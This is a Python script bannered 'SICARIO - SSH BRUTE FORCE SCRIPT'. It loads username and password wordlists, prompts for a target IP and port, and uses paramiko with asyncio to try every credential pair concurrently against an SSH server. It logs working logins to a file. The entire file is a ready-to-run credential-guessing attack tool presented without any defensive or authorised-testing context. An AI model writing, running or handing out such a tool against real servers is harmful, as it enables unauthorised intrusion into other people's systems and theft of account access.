import os
import paramiko
import asyncio
from tqdm import tqdm
import sys
import colorama
from prompt_toolkit import prompt
from prompt_toolkit.completion import PathCompleter

# Define colors using termcolor
SUCCESS_COLOR = 'green'
ERROR_COLOR = 'red'
RAINBOW_COLORS = [
    '\033[38;5;196m', '\033[38;5;202m', '\033[38;5;208m', '\033[38;5;214m',
    '\033[38;5;220m', '\033[38;5;226m', '\033[38;5;190m', '\033[38;5;154m',
    '\033[38;5;118m', '\033[38;5;82m', '\033[38;5;46m', '\033[38;5;47m',
    '\033[38;5;48m', '\033[38;5;49m', '\033[38;5;50m', '\033[38;5;51m',
    '\033[38;5;45m'
]

def center_text(text, width=80):
    return text.center(width)

def rainbow_banner(text):
    rainbow_text = ""
    for i, char in enumerate(text):
        rainbow_color = RAINBOW_COLORS[i % len(RAINBOW_COLORS)]
        rainbow_text += rainbow_color + char
    return rainbow_text + '\033[0m'

banner = rainbow_banner(center_text("""
██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███████╗███████╗██╗  ██╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██╔════╝██╔════╝██║  ██║
██████╔╝██████╔╝██║   ██║   ██║   █████╗█████╗███████╗███████╗███████║
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝╚════╝╚════██║╚════██║██╔══██║
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ███████║███████║██║  ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝
		SICARIO - SSH BRUTE FORCE SCRIPT | 23 
"""))

usr_arr = []
pass_arr = []

try:
    os.system('cls' if os.name == 'nt' else 'clear')
    print(banner)
    
    # Use PathCompleter for tab autocompletion on file paths
    user_list = prompt("Enter Path Of Users List: ", completer=PathCompleter())
    pass_list = prompt("Enter Path Of Password List: ", completer=PathCompleter())
    
    host = input("\n\033[38;5;220m[*] Enter target ip: \033[0m")
    port = input("\n\033[38;5;220m[*] Enter port: \033[0m")
    print('\n')
    print("\033[38;5;46m[+] BruteForce Started....\033[0m")
    print('\n')
except KeyboardInterrupt:
    print("\033[38;5;196m[X] You Pressed The Exit Button!\033[0m")
    quit()

users_lis = open(user_list, "r")
for l in users_lis:
    u = l.strip()
    usr_arr.append(u)
users_lis.close()

passwords = open(pass_list, "r")
for l in passwords:
    p = l.strip()
    pass_arr.append(p)
passwords.close()

success_file = "success-ssh.txt"  # File to store successful combinations

# Define an asynchronous function for SSH connection and authentication
async def ssh_bruteforce(username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        output_file = sys.stdout  # Backup the original stdout
        sys.stdout = open(os.devnull, 'w')  # Redirect stdout to /dev/null
        print("\033[38;5;202m[*] Username:\033[0m", username, "\033[38;5;202m| [*] Password:\033[0m", password)
        sys.stdout = output_file  # Restore the original stdout
        
        # Wrap the entire SSH connection attempt in a try-except block to suppress all exceptions
        try:
            await asyncio.to_thread(client.connect, host, port, username, password, timeout=5)
            print("\033[38;5;82m[✔] Valid Credentials Found - Check Success.txt\033[0m")
            with open(success_file, "a") as success:
                success.write(f"Username: {username} | Password: {password}\n")
        except Exception:
            pass  # Suppress all exceptions
        
        client.close()
    except Exception as e:
        print("\033[38;5;196mAn error occurred:", e, "\033[0m")

# Create an event loop and gather all SSH attempts concurrently with a progress bar
async def main():
    tasks = [ssh_bruteforce(user, password) for user in usr_arr for password in pass_arr]
    with tqdm(total=len(usr_arr) * len(pass_arr), desc="Progress") as pbar:
        for task in asyncio.as_completed(tasks):
            await task
            pbar.update(1)

# Run the event loop
if __name__ == "__main__":
    asyncio.run(main())

sys.stdout = sys.__stdout__
